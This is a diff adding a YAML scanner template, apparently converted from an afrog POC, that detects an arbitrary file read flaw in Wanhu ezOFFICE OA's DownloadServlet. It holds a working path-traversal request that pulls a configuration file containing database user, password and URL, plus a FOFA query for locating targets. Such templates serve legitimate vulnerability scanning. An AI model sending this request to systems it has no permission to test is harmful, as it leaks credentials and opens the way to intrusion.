@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ccerp.user
+          - ccerp.password
+          - ccerp.url
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2'
+id: wanhu-oa-downloadservlet-fileread
+info:
+  author: zan8in
+  description: |
+    万户OA DownloadServlet接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的敏感文件，获取敏感信息
+    fofa: app="万户网络-ezOFFICE"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 万户OA DownloadServlet 任意文件读取漏洞
+  severity: high
+  tags: wanhu,download,servlet,fileread,argus-import
